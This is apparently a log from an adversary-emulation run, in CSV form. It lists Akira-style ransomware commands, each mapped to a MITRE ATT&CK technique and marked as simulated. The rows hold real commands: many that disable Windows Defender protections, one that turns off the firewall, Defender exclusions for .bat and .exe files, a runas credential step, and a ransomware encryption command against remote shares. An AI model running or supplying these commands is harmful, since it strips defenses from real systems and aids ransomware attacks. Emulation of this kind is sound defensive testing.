"Timestamp","OriginalCommand","SimulatedAction","Technique","Status"
"2026-05-27 08:35:51","Set-MpPreference -EnableControlledFolderAccess Disabled","Windows Defender preference 'EnableControlledFolderAccess' would be set to 'Disabled' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:51","Set-MpPreference -PUAProtection disable","Windows Defender preference 'PUAProtection' would be set to 'disable' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:51","Set-MpPreference -DisableRealtimeMonitoring $true","Windows Defender preference 'DisableRealtimeMonitoring' would be set to '$true' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:51","Set-MpPreference -DisableBehaviorMonitoring $true","Windows Defender preference 'DisableBehaviorMonitoring' would be set to '$true' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:51","Set-MpPreference -DisableBlockAtFirstSeen $true","Windows Defender preference 'DisableBlockAtFirstSeen' would be set to '$true' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:51","Set-MpPreference -DisableIOAVProtection $true","Windows Defender preference 'DisableIOAVProtection' would be set to '$true' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:51","Set-MpPreference -DisablePrivacyMode $true","Windows Defender preference 'DisablePrivacyMode' would be set to '$true' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:51","Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true","Windows Defender preference 'SignatureDisableUpdateOnStartupWithoutEngine' would be set to '$true' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:51","Set-MpPreference -DisableArchiveScanning $true","Windows Defender preference 'DisableArchiveScanning' would be set to '$true' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:52","Set-MpPreference -DisableIntrusionPreventionSystem $true","Windows Defender preference 'DisableIntrusionPreventionSystem' would be set to '$true' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:52","Set-MpPreference -DisableScriptScanning $true","Windows Defender preference 'DisableScriptScanning' would be set to '$true' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:52","Set-MpPreference -SubmitSamplesConsent 2","Windows Defender preference 'SubmitSamplesConsent' would be set to '2' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:52","Set-MpPreference -MAPSReporting 0","Windows Defender preference 'MAPSReporting' would be set to '0' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:52","Set-MpPreference -HighThreatDefaultAction 6 -Force","Windows Defender preference 'HighThreatDefaultAction' would be set to '6 -Force' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:52","Set-MpPreference -ModerateThreatDefaultAction 6","Windows Defender preference 'ModerateThreatDefaultAction' would be set to '6' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:52","Set-MpPreference -LowThreatDefaultAction 6","Windows Defender preference 'LowThreatDefaultAction' would be set to '6' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:52","Set-MpPreference -SevereThreatDefaultAction 6","Windows Defender preference 'SevereThreatDefaultAction' would be set to '6' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:52","Set-MpPreference -ScanScheduleDay 8","Windows Defender preference 'ScanScheduleDay' would be set to '8' (disabling protection)","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:52","netsh advfirewall set allprofiles state off","Windows Firewall would be disabled for all profiles","T1562.004 - Impair Defenses: Disable or Modify System Firewall","Simulated"
"2026-05-27 08:35:52","Add-MpPreference -ExclusionExtension.bat","Defender exclusion would be added for specific extensions","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:52","Add-MpPreference -ExclusionExtension.exe","Defender exclusion would be added for specific extensions","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulated"
"2026-05-27 08:35:52","runas /netonly /user:<domain\user> CMD","A CMD session would be spawned with credentials: /netonly /user:<domain\user> CMD","T1078 - Valid Accounts (using runas)","Simulated"
"2026-05-27 08:35:52","<domain\user/password>","Unknown command - emulation skipped (logged only)","Unknown/Other","Simulated"
"2026-05-27 08:35:52","w.exe -p=\\<remote share> -n=1","Akira ransomware would encrypt files on remote shares: -p=\\<remote share> -n=1","T1486 - Data Encrypted for Impact","Simulated"
"2026-05-27 08:35:52","w.exe -p=\\<remote share> -n=1","Akira ransomware would encrypt files on remote shares: -p=\\<remote share> -n=1","T1486 - Data Encrypted for Impact","Simulated"
"2026-05-27 08:35:52","w.exe -p=\\<remote share> -n=1","Akira ransomware would encrypt files on remote shares: -p=\\<remote share> -n=1","T1486 - Data Encrypted for Impact","Simulated"
